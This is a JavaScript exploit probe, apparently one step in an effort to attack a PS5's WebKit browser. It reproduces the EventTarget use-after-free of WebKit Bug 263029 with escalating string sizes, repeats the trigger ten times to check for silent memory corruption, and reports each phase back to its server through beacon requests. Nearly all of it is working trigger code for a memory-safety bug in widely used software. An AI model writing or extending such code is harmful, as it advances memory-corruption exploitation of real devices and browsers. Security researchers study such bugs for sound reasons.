// p195 — EXACT WebKit test case reproduction for EventTarget UAF (Bug 263029)
// Previous p184 used 8MB strings. Original test uses 64MB.
// This uses 32MB (PS5 memory safe) and mirrors the EXACT pattern.
// Also tests whether the UAF silently corrupts without crashing.
//
// Beacon prefix: V195-

(function() {
  "use strict";

  var BASE = location.protocol + '//' + location.host;

  function syncB(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V195-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch(e) {}
  }

  syncB('BOOT');

  // Phase 1: EXACT reproduction with large strings
  function exactRepro(n, strSize) {
    syncB('EX-' + n + '-' + strSize + '-START');

    var f = document.body.appendChild(document.createElement('iframe'));
    var a = document.createElement('div');
    var b = a.appendChild(document.createElement('div'));

    var secondCalled = false;

    a.addEventListener('uaf', eval("(function() {\n" +
      "document.adoptNode(a);\n" +
      "f.remove();\n" +
      "throw {\n" +
      "  line: 1,\n" +
      "  column: 1,\n" +
      "  sourceURL: 'a'.repeat(" + strSize + ") + 'a'.repeat(" + strSize + ")\n" +
      "};\n" +
    "})"));

    a.addEventListener('uaf', function() {
      secondCalled = true;
    });

    b.addEventListener('uaf', function() {
      f.contentDocument.adoptNode(a);
    });

    syncB('EX-' + n + '-' + strSize + '-PRE');
    b.dispatchEvent(new Event('uaf', {bubbles: true}));
    syncB('EX-' + n + '-' + strSize + '-POST-' + (secondCalled ? 'YES' : 'NO'));
  }

  // Test with escalating string sizes
  // 1MB, 4MB, 16MB, 32MB
  var sizes = [
    [0, 1024 * 1024],
    [1, 4 * 1024 * 1024],
    [2, 16 * 1024 * 1024],
    [3, 32 * 1024 * 1024]
  ];

  for (var i = 0; i < sizes.length; i++) {
    try {
      exactRepro(sizes[i][0], sizes[i][1]);
    } catch(e) {
      syncB('EX-' + sizes[i][0] + '-OUTER-ERR');
    }
  }

  // Phase 2: Corruption detection
  // If UAF happened silently, memory might be corrupted.
  // Create objects and verify integrity.
  syncB('CORR-START');

  var sentinel = {
    a: 0xDEAD, b: 0xBEEF, c: 'sentinel_string_12345',
    d: [1,2,3,4,5], e: {nested: true, val: 42}
  };

  // Do 10 rounds of UAF then check sentinel
  for (var r = 0; r < 10; r++) {
    try {
      var f2 = document.body.appendChild(document.createElement('iframe'));
      var a2 = document.createElement('div');
      var b2 = a2.appendChild(document.createElement('div'));

      a2.addEventListener('x', eval("(function() {\n" +
        "document.adoptNode(a2);\n" +
        "f2.remove();\n" +
        "throw { line:1, column:1, sourceURL: 'Q'.repeat(16*1024*1024) };\n" +
      "})"));
      a2.addEventListener('x', function() {});
      b2.addEventListener('x', function() {
        f2.contentDocument.adoptNode(a2);
      });
      b2.dispatchEvent(new Event('x', {bubbles: true}));
    } catch(e) {}
  }

  // Verify sentinel integrity
  var ok = (sentinel.a === 0xDEAD && sentinel.b === 0xBEEF &&
            sentinel.c === 'sentinel_string_12345' &&
            sentinel.d.length === 5 && sentinel.e.val === 42);

  syncB('CORR-' + (ok ? 'INTACT' : 'CORRUPTED'));
  syncB('ALL-DONE');
})();
